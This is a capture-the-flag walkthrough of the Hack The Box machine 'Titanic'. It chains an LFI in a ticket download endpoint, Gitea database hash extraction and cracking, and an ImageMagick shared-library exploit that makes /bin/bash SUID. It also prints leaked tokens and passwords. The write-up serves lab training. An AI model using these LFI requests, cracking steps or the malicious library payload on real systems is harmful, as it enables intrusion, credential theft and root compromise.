---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - VirtualHosts
  - VHOST
  - Gitea
  - Container
  - LocalFileInclusion
  - LFI
  - sqlite3
  - Hashes
  - hashcat
  - Cracking
  - ImageMagick
  - ArbitraryCodeExecution
---

![](images/Titanic.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Virtual Host Enumeration](#Virtual-Host-Enumeration)
    - [Gitea Enumeration](#Gitea-Enumeration)
- [Local File Inclusion (LFI)](#Local-File-Inclusion-LFI)
    - [user.txt](#usertxt)
- [Foothold](#Foothold)
    - [Investigate sqlite3 Database](#Investigate-sqlite3-Database)
    - [Cracking the Hash](#Cracking-the-Hash)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [ImageMagick Arbitrary Code Execution](#ImageMagick-Arbitrary-Code-Execution)
- [root.txt](#roottxt)

## Summary

The box starts with a `booking system` for a cruise with the Titanic which is hilarious. The `web server` redirects to `titanic.htb`. A quick `enumeration` of available `Virtual Hosts (VHOSTs)` shows `dev` as a valid `vhost`. On `dev.titanic.htb` a running instance of `Gitea` can be found. The `publicly available` repositories leak some `usernames` and `credentials` for the `database` but those are not necessary to proceed with the box. However the `booking system` is also available and can be `cloned` for further investigation. On the `main website` it is possible to make a `booking` and find some `Local File Inclusion (LFI)` vulnerability in the `download function` for the `ticket`. Since the application runs inside a `container` but with a `shared volume` it's possible to `breakout and traverse the filesystem`. After retrieving the `app.ini` file the path for the `sqlite3 database` is shown and the `database` can be downloaded. From the `database` a the `hashes` for `administrator` and `developer` can be extracted and after `formatting them properly`, the `hash` for `developer` can be cracked using `hashcat`. With `foothold` on the box the `user.txt` can be accessed as usual. However the `LFI` makes this also possibly. A quick enumeration shows a `script` called `identify_images.sh` within `/opt/scripts` which makes use of `ImageMagick`. The version of `ImageMagick` is vulnerable to `Arbitrary Code Execution` through a malicious `library file`. This can be used to `escalate privileges` to `root` and to grab the `root.txt`.

## Reconnaissance

### Port Scanning

As usual we started with `scanning` the available `ports` on the box. As often only  port `22/TCP` and port `80/TCP` were open. On port `80/TCP` we noticed a `redirect` to `titanic.htb` which we added to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.113.41
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 20:01 CET
Nmap scan report for 10.129.113.41
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.113.41   titanic.htb
```

### Enumeration of Port 80/TCP

The website itself had a `booking system` for a cruise with the Titanic - lol. We found nothing special on the `application stack` besides the fact that it used `Python` and therefore `Werkzeug` which was an indicator for a `application` written in `Flask`.

- [http://titanic.htb/](http://titanic.htb/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://titanic.htb/
http://titanic.htb/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.129.113.41], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
```

![](images/2025-02-15_20-05_80_website.png)

![](images/2025-02-15_20-07_80_website_booking.png)

### Virtual Host Enumeration

Since we knew about the `redirect` to `Titanic.htb` we decided to `enumerate` potentially available `virtual hosts (VHOSTs)`. We got lucky and found `dev.titanic.htb` which we added also to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.titanic.htb" -u http://titanic.htb --fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13984, Words: 1107, Lines: 276, Duration: 51ms]
:: Progress: [151265/151265] :: Job [1/1] :: 59 req/sec :: Duration: [0:17:03] :: Errors: 50 ::
```

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.113.41   titanic.htb
10.129.113.41   dev.titanic.htb
```

### Gitea Enumeration

On `dev.titanic.htb` we found a running instance of `Gitea` in version `1.22.1`

![](images/2025-02-15_20-08_80_vhost_gitea.png)

![](images/2025-02-15_20-09_80_vhost_gitea_repositories.png)

| Version |
| ------- |
| 1.22.1  |

While `exploring` the publicly available `repositories` we found some `database credentials` in the `docker-compose.yml` file.

- [http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml](http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml)

```c
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Besides the newly found `username` of `sql_svc` and the corresponding password, we got another `username` called `developer`. This was the user which made the `commits`. Unfortunately we didn't found his password.

![](images/2025-02-15_20-14_80_vhost_gitea_database_credentials.png)

| Username  | Password       |
| --------- | -------------- |
| sql_svc   | MySQLP@$$w0rd! |
| developer |                |

## Local File Inclusion (LFI)

We headed back to the `booking system` and tried to get a ticket to enter the Titanic - still lol.

![](images/2025-02-15_20-20_80_book_ticket.png)

We `intercepted` the `request` with `Burp Suite` and `forwarded` it `once` to receive the `GET` request to `download` our `ticket`.

```c
GET /download?ticket=709969e9-42e2-4dd5-877d-062a59e43e43.json HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

After forwarding this one too an error was shown to us.

```c
HTTP/1.1 404 NOT FOUND
Date: Sat, 15 Feb 2025 19:21:50 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: application/json
Content-Length: 29
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"error":"Ticket not found"}

```

![](images/2025-02-15_20-22_80_download_ticket.png)

Since the application tried to grab a file stored on the disk, we decided to test for `Local File Inclusion (LFI)` and got lucky!

```c
GET /download?ticket=/etc/passwd HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 19:23:59 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/etc/passwd"
Content-Type: application/octet-stream
Content-Length: 1951
Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
Cache-Control: no-cache
ETag: "1738926979.4294043-1951-393413677"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```

![](images/2025-02-15_20-28_80_lfi_etc_passwd.png)

This is possible because the `application` was running in a `container` with a `shared volume` and therefore we could `traverse the filesystem`.

- [http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml](http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml)

```c
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

### user.txt

The `LFI` also allowed us to directly access the `user.txt`.

```c
GET /download?ticket=/home/developer/user.txt HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 19:26:38 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/user.txt"
Content-Type: text/plain; charset=utf-8
Content-Length: 33
Last-Modified: Sat, 15 Feb 2025 19:01:14 GMT
Cache-Control: no-cache
ETag: "1739646074.8236134-33-1893075274"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

c2b0057846184c54c8faa539fb3487fc

```

![](images/2025-02-15_20-28_80_lfi_usertxt.png)

### Further Enumeration

We moved along and cloned the application from the `Gitea` repository to run it ourselves to see if there were any interesting files located in the directory of `Gitea`. And indeed we found the `app.ini` which contained some useful information about the `path` for the `sqlite3` database.

```c
GET /download?ticket=/home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 19:40:44 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-2176520380"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

```

![](images/2025-02-15_20-42_80_lfi_appini.png)

```c
<--- CUT FOR BREVITY --->
PATH = /data/gitea/gitea.db
<--- CUT FOR BREVITY --->
```

```c
GET /download?ticket=/home/developer/gitea/data/gitea/gitea.db HTTP/1.1
Host: titanic.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

![](images/2025-02-15_20-46_80_lfi_sqlite.png)

## Foothold

### Investigate sqlite3 Database

We downloaded the `DB` to parse it properly.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Titanic/files]
└─$ wget 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -O gitea.db
--2025-02-15 20:47:50--  http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
Resolving titanic.htb (titanic.htb)... 10.129.113.41
Connecting to titanic.htb (titanic.htb)|10.129.113.41|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2084864 (2.0M) [application/octet-stream]
Saving to: ‘gitea.db’

gitea.db                                                   100%[========================================================================================================================================>]   1.99M   245KB/s    in 7.1s    

2025-02-15 20:47:57 (286 KB/s) - ‘gitea.db’ saved [2084864/2084864]
```

Since the `DB` had some size we decided to make our lives easier and opened it using `sqlitebrowser` to grab the `hashes` for `administrator` and `developer`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Titanic/files]
└─$ sqlitebrowser gitea.db
```

![](images/2025-02-15_20-50_sqlite_users.png)

### Cracking the Hash

We needed to `prepare` the `hashes` in order to crack them and our teammate `obskur3` came up with an amazing post of `0xdf` about how to format `Gitea hases` properly to used them with `hashcat`.

- [https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Titanic/files]
└─$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

After we received the correct `format` for the `hashes` we were able to `crack` the password for `developer`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Titanic/files]
└─$ hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

                                                          
Session..........: hashcat
Status...........: Quit
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: gitea.hashes
Time.Started.....: Sat Feb 15 21:02:26 2025 (2 mins, 25 secs)
Time.Estimated...: Sun Feb 16 03:19:45 2025 (6 hours, 14 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      634 H/s (7.50ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 172288/28688770 (0.60%)
Rejected.........: 0/172288 (0.00%)
Restore.Point....: 86016/14344385 (0.60%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:5120-6144
Candidate.Engine.: Device Generator
Candidates.#1....: burats -> andrea8
Hardware.Mon.#1..: Util: 95%

Started: Sat Feb 15 21:02:23 2025
Stopped: Sat Feb 15 21:04:52 2025
```

| Username  | Password |
| --------- | -------- |
| developer | 25282528 |

And with the newly cracked password we got access to the box via SSH.

```c
┌──(kali㉿kali)-[~]
└─$ ssh developer@10.129.113.41
developer@10.129.113.41's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Feb 15 08:03:13 PM UTC 2025

  System load:           0.16
  Usage of /:            68.3% of 6.79GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.113.41
  IPv6 address for eth0: dead:beef::250:56ff:fe94:642b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


developer@titanic:~$
```

## Enumeration

A quickly performed `enumeration` didn't showed any `groups of interest` or `sudo capabilities` nor any useful `ports` or `processes`.

```c
developer@titanic:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

```c
developer@titanic:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on titanic.
```

```c
developer@titanic:~$ ss -tulpn
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                 Peer Address:Port                Process                                           
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                        0.0.0.0:*                                                                     
udp                  UNCONN                0                     0                                          0.0.0.0:68                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                        0.0.0.0:22                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     4096                                     127.0.0.1:2222                                      0.0.0.0:*                                                                     
tcp                  LISTEN                0                     4096                                     127.0.0.1:3000                                      0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                      127.0.0.1:5000                                      0.0.0.0:*                    users:(("python3",pid=1147,fd=3))                
tcp                  LISTEN                0                     4096                                     127.0.0.1:45569                                     0.0.0.0:*                                                                     
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                        0.0.0.0:*                                                                     
tcp                  LISTEN                0                     128                                           [::]:22                                           [::]:*                                                                     
tcp                  LISTEN                0                     511                                              *:80                                              *:*
```

```c
developer@titanic:~$ ps -auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+   14286  0.0  0.1   8788  5528 pts/0    Ss   20:03   0:00 -bash
develop+   14507  0.0  0.0  10464  3788 pts/0    R+   20:11   0:00  \_ ps -auxf
develop+    1748  0.5  4.4 1537864 178368 ?      Ssl  19:01   0:24 /usr/local/bin/gitea web
develop+   14191  0.0  0.2  17068  9580 ?        Ss   20:03   0:00 /lib/systemd/systemd --user
develop+    1147  0.5  0.8 465368 32716 ?        Ss   19:01   0:24 /usr/bin/python3 /opt/app/app.py
```

However `jinmay` found some interesting files in `/opt/` and `obskur3` mentioned the `identify_images.sh` script in the `scripts` folder.

```c
developer@titanic:/opt/scripts$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Feb  7 10:37 .
drwxr-xr-x 5 root root 4096 Feb  7 10:37 ..
-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
```

```c
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

## Privilege Escalation to root

### ImageMagick Arbitrary Code Execution

The script we found made use of a tool called `ImageMagick`. Our new member `jinmay` came up with a `advisory` for `ImageMagick` about an `Arbitrary Code Execution` vulnerability.

```c
developer@titanic:/opt/scripts$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

- [https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

We performed a quick test to confirm that it would actually work.

```c
developer@titanic:/opt/app/static/assets/images$ cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
EOF
```

```c
developer@titanic:/opt/app/static/assets/images$ magick ./delegates.xml ./out.png 2>/dev/null
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

And as last step we modified the `Proof of Concept (PoC)` to our needs and ran it.

```c
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("chmod u+s /bin/bash");
    exit(0);
}
EOF
```

After a few seconds the `SUID` bit was set on `/bin/bash` and we were able to `elevate our privileges` to `root`.

```c
developer@titanic:/opt/app/static/assets/images$ /bin/bash -p
bash-5.1#
```

## root.txt

```c
bash-5.1# cat root.txt
07695745a087a80463381cb415d5e8b5
```
